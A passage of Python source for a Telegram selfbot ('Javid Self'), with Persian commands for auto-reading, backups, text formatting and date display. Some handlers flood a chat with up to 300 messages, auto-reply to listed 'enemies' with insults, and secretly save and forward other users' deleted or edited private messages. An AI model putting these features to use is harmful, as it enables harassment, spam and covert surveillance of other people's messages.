async def enable_auto_read_group(event):
    if not self_enabled:
        return
    global auto_read_group
    auto_read_group = True
    await event.edit("╮ سین خودکار گروه روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^سین خودکار گروه خاموش$'))
async def disable_auto_read_group(event):
    if not self_enabled:
        return
    global auto_read_group
    auto_read_group = False
    await event.edit("╮ سین خودکار گروه خاموش شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^سین خودکار ربات روشن$'))
async def enable_auto_read_bot(event):
    if not self_enabled:
        return
    global auto_read_bot
    auto_read_bot = True
    await event.edit("╮ سین خودکار ربات روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^سین خودکار ربات خاموش$'))
async def disable_auto_read_bot(event):
    if not self_enabled:
        return
    global auto_read_bot
    auto_read_bot = False
    await event.edit("╮ سین خودکار ربات خاموش شد. | Javid Self")

@client.on(events.NewMessage(incoming=True))
async def auto_read_handler(event):
    if not self_enabled:
        return
    if event.out:
        return

    try:
        if auto_read_private and event.is_private:
            sender = await event.get_sender()
            if not sender.bot:
                await event.mark_read()

        if auto_read_bot and event.is_private:
            sender = await event.get_sender()
            if sender.bot:
                await event.mark_read()

        if auto_read_group:
            chat = await event.get_chat()
            if getattr(chat, 'megagroup', False):
                await event.mark_read()

        if auto_read_channel:
            chat = await event.get_chat()
            if getattr(chat, 'broadcast', False):
                await event.mark_read()

    except Exception as e:
        print(f"{e}")

@client.on(events.NewMessage(outgoing=True, pattern=r'^اسپم(?: (.+))? (\d+)$'))
async def spam_handler(event):
    if not self_enabled:
        return
    args = event.pattern_match.group(1)
    count = int(event.pattern_match.group(2))

    if count > 300:
        await safe_respond(event, "╮ حداکثر اسپم 300 عدد می‌باشد! | Javid Self")
        return

    reply = None
    try:
        if is_fake_event(event) and hasattr(event._original, "get_reply_message"):
            reply = await event._original.get_reply_message()
        elif event.is_reply:
            reply = await event.get_reply_message()
    except Exception as e:
        print(f"{e}")

    try:
        if not is_fake_event(event):
            await event.delete()
    except Exception as e:
        print(f"{e}")

    if reply:
        for i in range(count):
            try:
                await client.send_message(event.chat_id, reply)
                await asyncio.sleep(0.1)
            except Exception as e:
                print(f"{e}")
                break
    elif args:
        text = args.strip()
        for i in range(count):
            try:
                await client.send_message(event.chat_id, text)
                await asyncio.sleep(0.2)
            except Exception as e:
                print(f"{e}")
                break
    else:
        await safe_respond(event, "╮ لطفاً ریپلای کنید یا متن وارد کنید! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^ریست$'))
async def reset_handler(event):
    if not self_enabled:
        return
    global rotate_enabled, rotate_family_enabled, rotate_bio_enabled
    global profile_enabled, stay_online, pv_lock_enabled, reactions_enabled
    global save_view_once_enabled, anti_login_enabled
    global auto_read_private, auto_read_channel, auto_read_group, auto_read_bot
    global name_list, family_list, bio_list, admin_list, enemy_list, reaction_users
    global track_deletions, track_edits, auto_reply_enabled, auto_reply_message, comment_channels, comment_content
    global time_font, date_font, time_font_family, date_font_family, time_font_bio, date_font_bio
    global typing_mode_private, typing_mode_group, game_mode_private, game_mode_group, voice_mode_private, voice_mode_group, video_mode_private, video_mode_group, admin_prefix, pv_mute_list

    rotate_enabled = False
    rotate_family_enabled = False
    rotate_bio_enabled = False
    profile_enabled = False
    stay_online = False
    pv_lock_enabled = False
    save_view_once_enabled = False
    anti_login_enabled = False
    auto_read_private = False
    auto_read_channel = False
    auto_read_group = False
    auto_read_bot = False
    track_deletions = False
    track_edits = False
    auto_reply_enabled = False
    auto_reply_message = None
    typing_mode_private = False
    typing_mode_group = False
    game_mode_private = False
    game_mode_group = False
    voice_mode_private = False
    voice_mode_group = False
    video_mode_private = False
    video_mode_group = False

    name_list.clear()
    family_list.clear()
    bio_list.clear()
    admin_list.clear()
    enemy_list.clear()
    comment_channels.clear()
    comment_content.clear()
    pv_mute_list.clear()

    time_font = 1
    date_font = 1
    time_font_family = 1
    date_font_family = 1
    time_font_bio = 1
    date_font_bio = 1
    admin_prefix = "."

    await event.edit("╮ تنظیمات باموفقیت ریست شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^تنظیم دشمن(?: (.+))?$'))
async def add_enemy(event):
    if not self_enabled:
        return
    global enemy_list
    user_input = event.pattern_match.group(1)
    user_id = None

    try:
        if is_fake_event(event) and hasattr(event._original, "get_reply_message"):
            reply = await event._original.get_reply_message()
            if reply:
                user_id = reply.sender_id
        elif event.is_reply:
            reply = await event.get_reply_message()
            if reply:
                user_id = reply.sender_id
        elif user_input:
            user_input = user_input.strip()
            if user_input.isdigit():
                user_id = int(user_input)
            else:
                entity = await client.get_entity(user_input)
                user_id = entity.id
        else:
            await event.edit("╮ استفاده نادرست از دستور! | Javid Self")
            return

        if user_id not in enemy_list:
            enemy_list.append(user_id)
            await event.edit("╮ کاربر به لیست دشمن اضافه شد. | Javid Self")
        else:
            await event.edit("╮ کاربر از قبل در لیست وجود دارد!")
    except Exception as e:
        print("{e}")
        await event.edit("خطا در تنظیم دشمن! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^حذف دشمن(?: (.+))?$'))
async def remove_enemy(event):
    if not self_enabled:
        return
    global enemy_list
    user_input = event.pattern_match.group(1)
    user_id = None

    try:
        if is_fake_event(event) and hasattr(event._original, "get_reply_message"):
            reply = await event._original.get_reply_message()
            if reply:
                user_id = reply.sender_id
        elif event.is_reply:
            reply = await event.get_reply_message()
            if reply:
                user_id = reply.sender_id
        elif user_input:
            user_input = user_input.strip()
            if user_input.isdigit():
                user_id = int(user_input)
            else:
                entity = await client.get_entity(user_input)
                user_id = entity.id
        else:
            await event.edit("╮ استفاده نادرست از دستور! | Javid Self")
            return

        if user_id in enemy_list:
            enemy_list.remove(user_id)
            await event.edit("╮ کاربر از لیست دشمن حذف شد. | Javid Self")
        else:
            await event.edit("╮ کاربر در لیست وجود ندارد!")
    except Exception as e:
        print("{e}")
        await event.edit("خطا در حذف دشمن! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^پاکسازی لیست دشمن$'))
async def clear_enemies(event):
    if not self_enabled:
        return
    global enemy_list
    enemy_list.clear()
    await event.edit("╮ لیست دشمن خالی شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^تنظیم فحش (.+)$'))
async def add_insult(event):
    if not self_enabled:
        return
    global insult_list
    insult = event.pattern_match.group(1).strip()
    insult_list.append(insult)
    await event.edit(f"""╮ فحش اضافه شد:
`{insult}`""")

@client.on(events.NewMessage(outgoing=True, pattern=r'^حذف فحش (.+)$'))
async def remove_insult(event):
    if not self_enabled:
        return
    global insult_list
    insult = event.pattern_match.group(1).strip()
    if insult in insult_list:
        insult_list.remove(insult)
        await event.edit(f"""╮ فحش حذف شد:
`{insult}`""")
    else:
        await event.edit("╮ فحش مورد نظر وجود ندارد! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^پاکسازی لیست فحش$'))
async def clear_insults(event):
    if not self_enabled:
        return
    global insult_list
    insult_list.clear()
    await event.edit("╮ لیست فحش خالی شد. | Javid Self")


@client.on(events.NewMessage(outgoing=True, pattern=r'^لیست فحش$'))
async def list_insults(event):
    if not self_enabled:
        return
    global insult_list
    if not insult_list:
        await event.edit("╮ لیست فحش خالی است! | Javid Self")
        return

    with open("insults.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(insult_list))

    try:
        if not is_fake_event(event):
            await event.delete()
    except Exception as e:
        print(f"{e}")

    await client.send_file(event.chat_id, "insults.txt", caption="╮ لیست فحش:")
    os.remove("insults.txt")

@client.on(events.NewMessage(outgoing=True, pattern=r'^لیست دشمن$'))
async def list_enemies(event):
    if not self_enabled:
        return
    global enemy_list
    if not enemy_list:
        await event.edit("╮ لیست دشمن خالی است! | Javid Self")
        return

    result = "╮ لیست دشمن:\n\n"
    for user_id in enemy_list:
        try:
            user = await client.get_entity(user_id)
            name = user.first_name or "?"
            mention = f"[{name}](tg://user?id={user_id})"
            result += f"> {mention}\n"
        except Exception as e:
            print(f"{e}")
            result += f"> (کاربر ناشناس)\n"

    await event.edit(result)

@client.on(events.NewMessage(outgoing=True, pattern=r'^تنظیم لیست فحش$'))
async def import_insult_file(event):
    if not self_enabled:
        return
    global insult_list

    reply = None
    if is_fake_event(event):
        try:
            reply = await event._original.get_reply_message()
        except:
            pass
    else:
        try:
            reply = await event.get_reply_message()
        except:
            pass

    if not reply or not reply.file or not reply.file.name.endswith(".txt"):
        await safe_respond(event, "╮ لطفاً به فایل .txt ریپلای کنید! | Javid Self")
        return

    path = await reply.download_media()
    try:
        with open(path, "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip()]

        if not lines:
            await safe_respond(event, "╮ فایل خالی است! | Javid Self")
            return

        insult_list.clear()
        insult_list.extend(lines)
        await safe_respond(event, f"╮ تعداد {len(insult_list)} فحش تنظیم شد. | Javid Self")
    except Exception as e:
        print(f"{e}")
        await safe_respond(event, "╮ خطا در تنظیم لیست! | Javid Self")
    finally:
        os.remove(path)

@client.on(events.NewMessage())
async def auto_insult(event):
    if not self_enabled:
        return
    global enemy_list, insult_list, insult_queue

    if not insult_list or not enemy_list:
        return

    try:
        chat = await event.get_chat()
        chat_username = getattr(chat, 'username', None)
        if chat_username and chat_username.lower() == "JavidSelfGp":
            return
    except Exception as e:
        print(f"{e}")
        return

    if event.sender_id in enemy_list:
        if not insult_queue:
            insult_queue = insult_list.copy()
            random.shuffle(insult_queue)

        insult = insult_queue.pop()
        try:
            await event.reply(insult)
        except Exception as e:
            print(f"{e}")

@client.on(events.NewMessage(incoming=True))
async def handle_new_message(event):
    if not self_enabled:
        return

    if not isinstance(event.message.peer_id, PeerUser):
        return

    msg: Message = event.message
    sender = await msg.get_sender()

    if sender and getattr(sender, 'bot', False):
        return

    first_name = getattr(sender, 'first_name', '') or ''
    last_name = getattr(sender, 'last_name', '') or ''
    account_name = f"{first_name} {last_name}".strip() or "بدون نام"

    content = msg.message or ''
    media_type = None
    media_link = None

    if msg.media and save_media_enabled:
        media_type = msg.file.mime_type or msg.file.ext or "media"
        file_path = await msg.download_media(file=os.path.join(DOWNLOAD_FOLDER, str(msg.id)))

        sent_msg = await client.send_file('me', file_path, caption=f"╮ مدیا از {account_name} (عددی: {sender.id})")

        chat_id_str = str(sent_msg.chat_id)
        if chat_id_str.startswith("-100"):
            media_link = f"https://t.me/c/{chat_id_str[4:]}/{sent_msg.id}"
        else:
            media_link = f"https://t.me/c/{chat_id_str}/{sent_msg.id}"
            
        os.remove(file_path)

    tehran_time = to_tehran_time(msg.date)

    cursor.execute('''
        INSERT INTO messages (message_id, user_id, username, content, date, media_type, media_link)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (
        msg.id, sender.id, account_name, content,
        tehran_time, media_type, media_link
    ))
    conn.commit()

@client.on(events.MessageEdited())
async def handle_edited_message(event):
    if not self_enabled:
        return
    global track_edits

    if not track_edits:
        return

    if not isinstance(event.message.peer_id, PeerUser):
        return

    msg: Message = event.message
    new_content = msg.message or ''

    cursor.execute('SELECT content, date, user_id FROM messages WHERE message_id=?', (msg.id,))
    row = cursor.fetchone()

    if row:
        old_content, original_date, user_id = row
        if old_content != new_content:
            cursor.execute('UPDATE messages SET content=? WHERE message_id=?', (new_content, msg.id))
            conn.commit()

            try:
                user_entity = await client.get_entity(user_id)

                account_name = f"{user_entity.first_name or ''} {user_entity.last_name or ''}".strip() or "بدون نام"
            except Exception:
                account_name = "ناشناس"

            text = (
                f"پیام ویرایش شده از پیوی کاربر: {account_name} - {user_id}\n"
                f"زمان ارسال: {original_date}\n\n"
                f"پیام قدیمی: {old_content}\n"
                f"پیام جدید: {new_content}"
            )
            
            await client.send_message('me', text, link_preview=False)


@client.on(events.MessageDeleted())
async def handle_deleted_message(event):
    if not self_enabled:
        return
    global track_deletions

    if not track_deletions:
        return

    for msg_id in event.deleted_ids:
        cursor.execute('SELECT * FROM messages WHERE message_id=?', (msg_id,))
        row = cursor.fetchone()

        if row and row[5] == 0:
            cursor.execute('UPDATE messages SET deleted=1 WHERE message_id=?', (msg_id,))
            conn.commit()

            user_id = row[1]
            content = row[3] or "بدون متن"
            original_date = row[4]

            try:
                user_entity = await client.get_entity(user_id)
                account_name = f"{user_entity.first_name or ''} {user_entity.last_name or ''}".strip() or "بدون نام"
            except Exception:
                account_name = "ناشناس"

            deleted_text = (
                f"پیام پاک شده از پیوی کاربر: {account_name} - {user_id}\n"
                f"زمان ارسال: {original_date}\n\n"
                f"متن پیام: {content}"
            )

            if row[6] and row[7]:
                deleted_text += f"\nنوع مدیا: {row[6]}\nلینک مدیا: {row[7]}"

            await client.send_message('me', deleted_text, link_preview=False)

@client.on(events.NewMessage(outgoing=True, pattern=r'^ذخیره حذف روشن$'))
async def enable_savedel(event):
    if not self_enabled:
        return
    global track_deletions
    track_deletions = True
    await event.edit("╮ ذخیره حذف روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^ذخیره حذف خاموش$'))
async def disable_savedel(event):
    if not self_enabled:
        return
    global track_deletions
    track_deletions = False
    await event.edit("╮ ذخیره حذف خاموش شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^ذخیره ویرایش روشن$'))
async def enable_savedit(event):
    if not self_enabled:
        return
    global track_edits
    track_edits = True
    await event.edit("╮ ذخیره ویرایش روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^ذخیره ویرایش خاموش$'))
async def disable_savedit(event):
    if not self_enabled:
        return
    global track_edits
    track_edits = False
    await event.edit("╮ ذخیره ویرایش خاموش شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^منشی روشن$'))
async def enable_auto_reply(event):
    if not self_enabled:
        return
    global auto_reply_enabled
    auto_reply_enabled = True
    await event.edit("╮ مشنی روشن شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^منشی خاموش$'))
async def disable_auto_reply(event):
    if not self_enabled:
        return
    global auto_reply_enabled
    auto_reply_enabled = False
    await event.edit("╮ منشی خاموش شد. | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^تنظیم منشی$'))
async def set_auto_reply(event):
    if not self_enabled:
        return
    global auto_reply_message

    try:
        reply = None

        if is_fake_event(event) and hasattr(event._original, "get_reply_message"):
            reply = await event._original.get_reply_message()
        elif event.is_reply:
            reply = await event.get_reply_message()

        if not reply:
            await event.edit("╮ استفاده نادرست از دستور! | Javid Self")
            return

        auto_reply_message = reply
        await event.edit("╮ تنظیم شد.")
    except Exception as e:
        print(f"{e}")
        await event.edit("خطا در تنظیم محتوای منشی! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^تنظیم زمان منشی (\d+)$'))
async def set_auto_reply_interval(event):
    if not self_enabled:
        return
    global auto_reply_interval

    minutes = int(event.pattern_match.group(1))
    if minutes < 5 or minutes > 60:
        await event.edit("╮ فقط اعداد 5 الی 60 دقیقه مجاز می‌باشد! | Javid Self")
        return

    auto_reply_interval = minutes * 60
    await event.edit(f"╮ زمان منشی روی {minutes} دقیقه تنظیم شد. | Javid Self")

@client.on(events.NewMessage(incoming=True))
async def auto_reply_handler(event):
    if not self_enabled:
        return

    global auto_reply_enabled, auto_reply_message, auto_reply_interval, last_auto_reply_times

    if not event.is_private or not auto_reply_enabled or not auto_reply_message:
        return

    try:
        sender = await event.get_sender()

        if getattr(sender, "bot", False):
            return

        me = await client.get_me()
        if isinstance(me.status, types.UserStatusOnline):
            return
    except Exception as e:
        print(f"{e}")
        return

    user_id = event.sender_id
    now = time.time()
    last_time = last_auto_reply_times.get(user_id)

    if last_time and (now - last_time) < auto_reply_interval:
        return

    try:
        if auto_reply_message.media:
            await client.send_file(
                event.chat_id,
                file=auto_reply_message.media,
                caption=auto_reply_message.message or "",
                reply_to=event.id
            )
        elif auto_reply_message.message:
            await event.reply(auto_reply_message.message)

        last_auto_reply_times[user_id] = now

    except Exception as e:
        print(f"{e}")

@client.on(events.NewMessage(outgoing=True, pattern=r'^دریافت بکاپ$'))
async def backup_handler(event):
    if not self_enabled:
        return
    backup_data = {
        "backup_signature": "JavidSelf_backup_v2.2",
        "name_list": name_list,
        "rotate_enabled": rotate_enabled,
        "current_index": current_index,
        "time_font": time_font,
        "date_font": date_font,
        "bio_list": bio_list,
        "family_list": family_list,
        "rotate_family_enabled": rotate_family_enabled,
        "current_family_index": current_family_index,
        "time_font_family": time_font_family,
        "date_font_family": date_font_family,
        "rotate_bio_enabled": rotate_bio_enabled,
        "current_bio_index": current_bio_index,
        "admin_list": admin_list,
        "stay_online": stay_online,
        "time_format_12h": time_format_12h,
        "date_type": date_type,
        "current_halat": current_halat,
        "comment_channels": list(comment_channels),
        "pv_mute_list": pv_mute_list,
        "comment_content": comment_content,
        "profile_enabled": profile_enabled,
        "profile_channel_id": profile_channel_id,
        "profile_interval_minutes": profile_interval_minutes,
        "profile_max_count": profile_max_count,
        "used_profile_photo_ids": used_profile_photo_ids,
        "pv_lock_enabled": pv_lock_enabled,
        "pv_warned_users": list(pv_warned_users),
        "save_view_once_enabled": save_view_once_enabled,
        "anti_login_enabled": anti_login_enabled,
        "last_youtube_time": last_youtube_time,
        "last_instagram_time": last_instagram_time,
        "last_gpt_time": last_gpt_time,
        "auto_read_private": auto_read_private,
        "auto_read_channel": auto_read_channel,        "typing_mode_private": typing_mode_private,
        "typing_mode_group": typing_mode_group,
        "game_mode_private": game_mode_private,
        "game_mode_group": game_mode_group,
        "voice_mode_private": voice_mode_private,
        "voice_mode_group": voice_mode_group,        "video_mode_private": video_mode_private,
        "video_mode_group": video_mode_group,
        "auto_read_group": auto_read_group,
        "auto_read_bot": auto_read_bot,
        "enemy_list": enemy_list,
        "insult_list": insult_list,
        "insult_queue": insult_queue,
        "track_deletions": track_deletions,
        "track_edits": track_edits,
        "auto_reply_enabled": auto_reply_enabled,
        "auto_reply_interval": auto_reply_interval,
        "last_auto_reply_times": last_auto_reply_times,
        "auto_react": auto_react,
        "admin_prefix": admin_prefix
    }

    with open("backup.json", "w", encoding="utf-8") as f:
        json.dump(backup_data, f, ensure_ascii=False, indent=2)

    reply_id = None
    try:
        if is_fake_event(event) and hasattr(event._original, "id"):
            reply_id = event._original.id

        if not is_fake_event(event):
            await event.delete()
    except Exception as e:
        print(f"{e}")

    await client.send_file(event.chat_id, "backup.json", caption="╮ بکاپ ایجاد شد! | Javid Self", reply_to=reply_id)
    os.remove("backup.json")

@client.on(events.NewMessage(outgoing=True, pattern=r'^اجرای بکاپ$'))
async def restore_backup(event):
    if not self_enabled:
        return
    global name_list, rotate_enabled, current_index, time_font, date_font
    global bio_list, family_list, rotate_family_enabled, current_family_index
    global time_font_family, date_font_family, rotate_bio_enabled, current_bio_index
    global admin_list, stay_online, time_format_12h, profile_enabled, profile_channel_id
    global profile_interval_minutes, profile_max_count, used_profile_photo_ids
    global pv_lock_enabled, pv_warned_users, save_view_once_enabled, anti_login_enabled
    global last_youtube_time, last_instagram_time, last_gpt_time
    global auto_read_private, auto_read_channel, auto_read_group, auto_read_bot
    global enemy_list, insult_list, insult_queue
    global track_deletions, track_edits
    global auto_reply_enabled, auto_reply_interval, last_auto_reply_times, comment_channels, comment_content
    global typing_mode_private, typing_mode_group, game_mode_private, game_mode_group, voice_mode_private, voice_mode_group, video_mode_private, video_mode_group, admin_prefix, pv_mute_list

    try:
        reply = None

        if is_fake_event(event) and hasattr(event._original, "get_reply_message"):
            reply = await event._original.get_reply_message()
        elif event.is_reply:
            reply = await event.get_reply_message()

        if not reply or not reply.file:
            await event.edit("╮ استفاده نادرست از دستور! | Javid Self")
            return

        path = await reply.download_media()
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)

        if data.get("backup_signature") != "JavidSelf_backup_v2.2":
            await event.edit("╮ این فایل بکاپ معتبر نیست! | Javid Self")
            os.remove(path)
            return

        name_list = data.get("name_list", [])
        rotate_enabled = data.get("rotate_enabled", False)
        current_index = data.get("current_index", 0)
        time_font = data.get("time_font", 1)
        date_font = data.get("date_font", 1)
        bio_list = data.get("bio_list", [])
        family_list = data.get("family_list", [])
        rotate_family_enabled = data.get("rotate_family_enabled", False)
        current_family_index = data.get("current_family_index", 0)
        time_font_family = data.get("time_font_family", 1)
        date_font_family = data.get("date_font_family", 1)
        rotate_bio_enabled = data.get("rotate_bio_enabled", False)
        typing_mode_private = data.get("typing_mode_private", False)
        typing_mode_group = data.get("typing_mode_group", False)
        game_mode_private = data.get("game_mode_private", False)
        game_mode_group = data.get("game_mode_group", False)
        voice_mode_private = data.get("voice_mode_private", False)
        voice_mode_group = data.get("voice_mode_group", False)
        video_mode_private = data.get("video_mode_private", False)
        video_mode_group = data.get("video_mode_group", False)
        current_bio_index = data.get("current_bio_index", 0)
        admin_list = data.get("admin_list", [])
        pv_mute_list = data.get("pv_mute_list", [])
        stay_online = data.get("stay_online", False)
        time_format_12h = data.get("time_format_12h", False)
        date_type = data.get("date_type", "jalali")
        profile_enabled = data.get("profile_enabled", False)
        profile_channel_id = data.get("profile_channel_id", None)
        current_halat = data.get("current_halat", None)
        profile_interval_minutes = data.get("profile_interval_minutes", 30)
        profile_max_count = data.get("profile_max_count", 1)
        used_profile_photo_ids = data.get("used_profile_photo_ids", [])
        pv_lock_enabled = data.get("pv_lock_enabled", False)
        pv_warned_users = set(data.get("pv_warned_users", []))
        save_view_once_enabled = data.get("save_view_once_enabled", False)
        anti_login_enabled = data.get("anti_login_enabled", False)
        last_youtube_time = data.get("last_youtube_time", 0)
        admin_prefix = data.get("admin_prefix", "+ ")
        last_instagram_time = data.get("last_instagram_time", 0)
        last_gpt_time = data.get("last_gpt_time", 0)
        auto_read_private = data.get("auto_read_private", False)
        auto_read_channel = data.get("auto_read_channel", False)
        auto_read_group = data.get("auto_read_group", False)
        auto_read_bot = data.get("auto_read_bot", False)
        enemy_list = data.get("enemy_list", [])
        insult_list = data.get("insult_list", [])
        insult_queue = data.get("insult_queue", [])
        comment_channels = set(data.get("comment_channels", []))
        comment_content = data.get("comment_content", {})
        track_deletions = data.get("track_deletions", False)
        track_edits = data.get("track_edits", False)
        auto_reply_enabled = data.get("auto_reply_enabled", False)
        auto_reply_interval = data.get("auto_reply_interval", 600)
        last_auto_reply_times = data.get("last_auto_reply_times", {})
        auto_react = data.get("auto_react", {})

        os.remove(path)
        await event.edit("╮ بکاپ اجرا شد. | Javid Self")
    except Exception as e:
        print(f"{e}")
        await event.edit("╮ خطا در اجرای بکاپ! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^امروز$'))
async def today_handler(event):
    if not self_enabled:
        return
    try:
        tehran_tz = pytz.timezone('Asia/Tehran')
        now_utc = datetime.now(timezone.utc)
        now_tehran = now_utc.astimezone(tehran_tz)

        miladi_time = now_tehran.strftime("%H:%M")
        utc_time = now_utc.strftime("%H:%M")

        miladi_date = now_tehran.strftime("%Y/%m/%d")
        miladi_day = now_tehran.strftime("%A")

        jalali_now = jdatetime.datetime.fromgregorian(datetime=now_tehran)
        jalali_date = jalali_now.strftime("%Y/%m/%d")
        jalali_day = jalali_now.strftime("%A")

        week_days_fa = {
            "Saturday": "شنبه",
            "Sunday": "یکشنبه",
            "Monday": "دوشنبه",
            "Tuesday": "سه‌شنبه",
            "Wednesday": "چهارشنبه",
            "Thursday": "پنجشنبه",
            "Friday": "جمعه"
        }
        miladi_day_fa = week_days_fa.get(miladi_day, miladi_day)
        jalali_day_fa = week_days_fa.get(jalali_day, jalali_day)

        current_j_year = jalali_now.year
        next_norooz_j = jdatetime.datetime(current_j_year + 1 if jalali_now.month > 1 or (jalali_now.month == 1 and jalali_now.day > 1) else current_j_year, 1, 1, 0, 0)
        next_norooz_g = next_norooz_j.togregorian().replace(tzinfo=tehran_tz)
        delta_norooz = next_norooz_g - now_tehran
        days_n = delta_norooz.days
        hours_n, remainder_n = divmod(delta_norooz.seconds, 3600)
        minutes_n = remainder_n // 60

        current_m_year = now_tehran.year
        christmas = datetime(current_m_year, 12, 25, tzinfo=tehran_tz)
        if now_tehran > christmas:
            christmas = christmas.replace(year=current_m_year + 1)
        delta_christmas = christmas - now_tehran
        days_c = delta_christmas.days
        hours_c, remainder_c = divmod(delta_christmas.seconds, 3600)
        minutes_c = remainder_c // 60

        text = f"""اطلاعات امروز:

╮ ساعت (تهران) : {miladi_time}
│ تاریخ (شمسی) : {jalali_day_fa} - {jalali_date}
╯ باقی مانده تا نوروز : {days_n} روز و {hours_n} ساعت و {minutes_n} دقیقه

╮ ساعت (جهانی) : {utc_time}
│ تاریخ (میلادی) : {miladi_day_fa} - {miladi_date}
╯ باقی مانده تا کریسمس : {days_c} روز و {hours_c} ساعت و {minutes_c} دقیقه"""

        await event.edit(text)

    except Exception as e:
        print(f"{e}")
        await event.edit("╮ خطا در دریافت تاریخ و زمان! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^پاکسازی من (.+)$'))
async def clear_my_messages(event):
    if not self_enabled:
        return
    try:
        arg = event.pattern_match.group(1).strip()
        me = await client.get_me()
        my_id = me.id

        is_admin = is_fake_event(event)

        if not is_admin:
            try:
                await event.delete()
            except:
                pass

        chat_id = event.chat_id if not is_admin else event._original.chat_id
        ref_msg_id = event.id if not is_admin else event._original.id

        if arg == "همه":
            async for msg in client.iter_messages(chat_id):
                if msg.sender_id == my_id:
                    try:
                        await msg.delete()
                    except:
                        pass
            return

        if arg.isdigit():
            limit = int(arg)
            deleted = 0

            async for msg in client.iter_messages(chat_id, limit=limit + 50, max_id=ref_msg_id):
                if msg.sender_id == my_id:
                    try:
                        await msg.delete()
                        deleted += 1
                        if deleted >= limit:
                            break
                    except:
                        pass
            return

        await safe_respond(event, "╮ استفاده نادرست از دستور! | Javid Self")

    except Exception as e:
        print(f"[clear_my_messages error] {e}")
        await safe_respond(event, "╮ خطا در پاکسازی! | Javid Self")

@client.on(events.NewMessage(outgoing=True, pattern=r'^تنظیم تاریخ (.+)$'))
async def set_date_type(event):
    if not self_enabled:
        return
    global date_type
    arg = event.pattern_match.group(1).strip().lower()

    if arg in ["شمسی", "jalali"]:
        date_type = "jalali"
        await event.edit("╮ نوع تاریخ روی شمسی تنظیم شد. | Javid Self")
    elif arg in ["میلادی", "gregorian"]:
        date_type = "gregorian"
        await event.edit("╮ نوع تاریخ روی میلادی تنظیم شد. | Javid Self")
    else:
        await event.edit("╮ استفاده نادرست از دستور! | Javid Self")

class CustomMarkdown:
    @staticmethod
    def parse(text):
        text, entities = markdown.parse(text)
        for i, e in enumerate(entities):
            if isinstance(e, types.MessageEntityTextUrl):
                if e.url == 'spoiler':
                    entities[i] = types.MessageEntitySpoiler(e.offset, e.length)
                elif e.url.startswith('emoji/'):
                    entities[i] = types.MessageEntityCustomEmoji(e.offset, e.length, int(e.url.split('/')[1]))
        return text, entities

    @staticmethod
    def unparse(text, entities):
        for i, e in enumerate(entities or []):
            if isinstance(e, types.MessageEntityCustomEmoji):
                entities[i] = types.MessageEntityTextUrl(e.offset, e.length, f'emoji/{e.document_id}')
            if isinstance(e, types.MessageEntitySpoiler):
                entities[i] = types.MessageEntityTextUrl(e.offset, e.length, 'spoiler')
        return markdown.unparse(text, entities)

@client.on(events.NewMessage(outgoing=True))
async def halat_handler(event):
    if not self_enabled:
        return
    global current_halat

    message = event.message
    text = message.text.strip() if message.text else ""

    halat_map = {
        "بولد": "bold",
        "ایتالیک": "italic",
        "زیرخط": "underline",
        "استرایک": "strikethrough",
        "کدینگ": "mono",
        "اسپویلر": "spoiler"
    }

    if text.startswith("تنظیم حالت "):
        fa_halat = text[len("تنظیم حالت "):].strip()
        halating = halat_map.get(fa_halat)

        if not halating:
            await message.edit("╮ حالت نامعتبر است! | Javid Self")
        else:
            current_halat = halating
            await message.edit(f"╮ حالت متن روی {fa_halat} تنظیم شد. | Javid Self")

    elif text == "حالت متن خاموش":
        current_halat = None
        await message.edit("╮ حالت متن خاموش شد. | Javid Self")

    else:
        if any(re.fullmatch(p, text) for p in patterns):
            return
        else:
            if not message.text and message.media:
                return

            if current_halat is not None and message.text:
                text_to_format = message.text
                formatted = text_to_format

                if current_halat == "bold":
                    formatted = f"<b>{formatted}</b>"
                elif current_halat == "italic":
                    formatted = f"<i>{formatted}</i>"
                elif current_halat == "strikethrough":
                    formatted = f"<s>{formatted}</s>"
                elif current_halat == "underline":
                    formatted = f"<u>{formatted}</u>"
                elif current_halat == "mono":
                    formatted = f"<code>{formatted}</code>"
                elif current_halat == "spoiler":
                    formatted_text = f"[{text_to_format}](spoiler)"
                    text, entities = CustomMarkdown.parse(formatted_text)
                    await message.edit(text, formatting_entities=entities)
                    return

                await message.edit(formatted, parse_mode="html")

@client.on(events.NewMessage(outgoing=True, pattern=r'^\+?ایدی(?: ([^\n]+))?$'))
async def user_info_handler(event):
    if not self_enabled:
        return
    is_admin = is_fake_event(event)
    reply = await (event._original.get_reply_message() if is_admin else event.get_reply_message())
    arg = event.pattern_match.group(1)
    user = None
    wait_msg = None

    if not is_admin:
        try:
            await event.edit("╮ لطفاً صبر کنید... | Javid Self")
            wait_msg = event
        except:
            wait_msg = await event.respond("╮ لطفاً صبر کنید... | Javid Self")
    else:
        wait_msg = await event._original.reply("╮ لطفاً صبر کنید... | Javid Self")

    try:
        if reply:
            user = await client.get_entity(reply.sender_id)
        elif arg:
            if arg.isdigit():
                user = await client.get_entity(PeerUser(int(arg)))
            else:
                user = await client.get_entity(arg)
        else:
            await wait_msg.edit("╮ استفاده نادرست از دستور! | Javid Self")
            return
    except Exception as e:
        print(f"{e}")
        await wait_msg.edit("╮ کاربر یافت نشد! | Javid Self")
        return

    try:
        user_id = user.id

        username = "-"
        if user.username:
            username = f"@{user.username}"
